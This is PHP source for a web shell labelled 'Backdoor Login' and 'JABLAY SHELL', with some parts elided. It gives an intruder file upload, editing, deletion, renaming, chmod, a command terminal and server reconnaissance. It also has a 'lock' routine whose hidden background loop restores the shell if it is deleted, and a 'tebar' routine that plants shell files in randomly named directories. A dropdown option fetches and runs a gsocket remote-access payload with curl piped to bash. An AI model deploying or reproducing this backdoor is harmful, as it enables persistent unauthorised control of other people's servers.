...
function background_slider() {
    ...
    echo '</div><div class="overlay"></div>';
}
...
if (!isset($_SESSION['login'])) {
    ...
    <style>
    html, body {height: 100%;margin: 0;overflow: hidden; overflow-y: auto;}
    .slider-wrapper {position: fixed;top: 0;left: 0;width: 200vw;height: 100vh;display: flex;flex-wrap: wrap;z-index: -2;animation: slide 20s linear infinite;}
    .slider-wrapper img {width: 33.33vw;height: 50vh;object-fit: cover;}
    ...
    </head><body class="flex items-center justify-center text-white">';
    background_slider();
    echo '
    <div class="bg-black/70 p-8 rounded shadow-md text-center w-full max-w-md z-10 backdrop-blur-sm">
        <h2 class="text-3xl font-bold text-red-400 mb-6">Backdoor Login</h2>
        <form method="POST">
...
if (!empty($_FILES['upload'])) move_uploaded_file($_FILES['upload']['tmp_name'], $dirReal.'/'.basename($_FILES['upload']['name']));
if (!empty($_POST['newfile'])) file_put_contents($dirReal.'/'.basename($_POST['newfile']), '');
if (!empty($_POST['newfolder'])) @mkdir($dirReal.'/'.basename($_POST['newfolder']));
if (isset($_POST['savefile'], $_POST['filename'])) {
    file_put_contents($_POST['filename'], $_POST['savefile']);
    header("Location: ?path=".urlencode(dirname($_POST['filename'])));
    exit;
}
if (isset($_GET['edit']) && is_file($_GET['edit'])) {
    ...
    <h2 class='text-4xl mb-6'>Edit: <span class='text-green-400'>".basename($f)."</span></h2>
...
if (isset($_GET['del']) && file_exists($_GET['del'])) {
    is_dir($_GET['del']) ? rmdir($_GET['del']) : unlink($_GET['del']);
    header("Location: ?path=".urlencode(dirname($_GET['del'])));
    exit;
}
if (isset($_POST['rename_from'], $_POST['rename_to'])) {
    rename($_POST['rename_from'], dirname($_POST['rename_from']).'/'.basename($_POST['rename_to']));
    header("Location: ?path=".urlencode(dirname($_POST['rename_from'])));
    exit;
}
if (isset($_POST['target'], $_POST['perm'])) {
    chmod($_POST['target'], octdec($_POST['perm']));
    header("Location: ?path=".urlencode(dirname($_POST['target'])));
    exit;
}
if (isset($_GET['lock']) && is_file($_GET['lock'])) {
    $f = realpath($_GET['lock']); $hash = md5($f);
    $cache = '/dev/shm/.cache'; @mkdir($cache,0777,true);
    copy($f,"$cache/$hash.php");
    chmod($f,0444);
    $cmd = PHP_BINARY." -r 'while(1){if(!file_exists(\"$f\")){copy(\"$cache/$hash.php\",\"$f\");chmod(\"$f\",0444);}sleep(2);}' > /dev/null 2>&1 &";
    system($cmd);
...
if (isset($_POST['tebar']) && !empty($_POST['tebar_start']) && is_dir($_POST['tebar_start'])) {
    $base = realpath($_POST['tebar_start']);
    $srcData = '<?php echo "Shell Tebar!"; ?>';
    @mkdir('/tmp/.cache',0777,true);
    $srcFile = '/tmp/.cache/'.rand_str(10).'.txt';
    file_put_contents($srcFile, $srcData);
    $result = "<h3 class='text-green-400 text-xl mb-4'>Tersebar ke:</h3><ul class='list-disc ml-6'>";
    for ($i=0; $i<5; $i++) {
        $path = $base;
        for ($d=0; $d<3; $d++) { $path .= '/'.rand_str(5); @mkdir($path,0777,true); }
...
<?php background_slider(); ?>

<h1 class="text-5xl mb-6 text-center text-red-400 font-bold">౨ৎ JABLAY SHELL ౨ৎ</h1>
<div class="mb-4 text-sm">
  <div><span class="text-green-400 font-bold">Uname:</span> <?= htmlspecialchars($uname) ?></div>
  <div><span class="text-pink-400 font-bold">User:</span> <?= htmlspecialchars($user) ?></div>
  <div><span class="text-red-400 font-bold">Server IP:</span> <?= htmlspecialchars($serverIP) ?> <span class="ml-4">Your IP: <?= htmlspecialchars($clientIP) ?></span></div>
  <div><span class="text-purple-400 font-bold">PHP:</span> <?= htmlspecialchars($phpVer) ?></div>
  <div><span class="text-yellow-400 font-bold">Disk:</span> <?= round($disk/1e9,2) ?> GB, <span class="text-green-300">Free <?= round($free/1e9,2) ?> GB (<?= 100-$percent ?>%)</span></div>
  <div><span class="text-blue-400 font-bold">Open_basedir:</span> <?= htmlspecialchars($open_basedir) ?></div>
</div>
...
<form method="POST" class="mb-10">
  ...
  <?php if (!empty($terminalOutput)) echo "<pre class='bg-black text-green-400 mt-2 p-2 rounded'>".htmlspecialchars($terminalOutput)."</pre>"; ?>
</form>
...
<form method="POST" class="mb-10">
  ...
  <select name="gs_command" class="w-full text-black p-2 rounded">
    ...
    <option value='GS_NOCERTCHECK=1 bash -c "$(curl -fsSLk https://gsocket.io/y)"'>curl (no cert)</option>
  ...
  <?php if (!empty($gsOutput)) echo "<pre class='bg-black text-red-400 mt-2 p-2 rounded'>".htmlspecialchars($gsOutput)."</pre>"; ?>
</form>
...
<form method="POST" class="mb-4">
  ...
  <input type="text" name="tebar_start" class="w-full text-black p-2 rounded" placeholder="/path/to/dir">
  <button type="submit" name="tebar" class="mt-2 bg-orange-600 w-full py-2 rounded">Tebar Shell</button>
</form>
<?php if (!empty($_SESSION['tebar_result'])) { echo "<div class='bg-gray-800 p-4 rounded mb-6'>{$_SESSION['tebar_result']}</div>"; unset($_SESSION['tebar_result']); } ?>

<div class="text-sm mb-4">Path:
<?php
$parts = explode(DIRECTORY_SEPARATOR, $dirReal);
$build = '';
foreach ($parts as $p) {
  if ($p === '') continue;
...
<table class="w-full table-auto border border-gray-700"><thead><tr class="bg-gray-800"><th class="p-2">Name</th><th class="p-2">Size</th><th class="p-2">Action</th></tr></thead><tbody>
<?php
$files = is_readable($dirReal) ? array_diff(scandir($dirReal), ['.', '..']) : [];
$dirs=[]; $normal=[];
foreach($files as $f){
  $full=$dirReal.DIRECTORY_SEPARATOR.$f;
  is_dir($full)?$dirs[]=$f:$normal[]=$f;
}
foreach(array_merge($dirs,$normal) as $f){
  $full=$dirReal.DIRECTORY_SEPARATOR.$f; $isDir=is_dir($full);
  $size=$isDir?'DIR':filesize($full).' B';
  $name=$isDir?"<a href='?path=".urlencode($full)."' class='text-yellow-400 hover:underline'>".htmlspecialchars($f)."</a>":htmlspecialchars($f);
  $acts=[];
  if(!$isDir){
    $acts[]="<a href='?edit=".urlencode($full)."' class='text-green-400'>[Edit]</a>";
    $acts[]="<a href='?download=".urlencode($full)."' class='text-blue-400'>[Download]</a>";
  }
  $acts[]="<form method='POST' class='inline'><input type='hidden' name='rename_from' value='".htmlspecialchars($full)."'><input name='rename_to' value='".htmlspecialchars($f)."' class='text-black p-1 rounded'><button class='text-purple-400 ml-1' type='submit'>[Rename]</button></form>";
  $acts[]="<a href='?del=".urlencode($full)."' class='text-red-400'>[Delete]</a>";
  $acts[]="<form method='POST' class='inline'><input type='hidden' name='target' value='".htmlspecialchars($full)."'><input name='perm' value='".substr(sprintf('%o', fileperms($full)),-4)."' class='text-black p-1 w-16 rounded'><button class='text-yellow-400 ml-1' type='submit'>[Chmod]</button></form>";
  $acts[]="<a href='?lock=".urlencode($full)."' class='text-gray-400'>[Lock]</a>";
  $acts[]="<a href='?unlock=".urlencode($full)."' class='text-white'>[Unlock]</a>";
  echo "<tr class='border-t border-gray-700'><td class='p-2'>$name</td><td class='p-2 text-center'>$size</td><td class='p-2 space-x-2'>".implode(' ',$acts)."</td></tr>";
}
?>
</tbody></table>
</body></html>
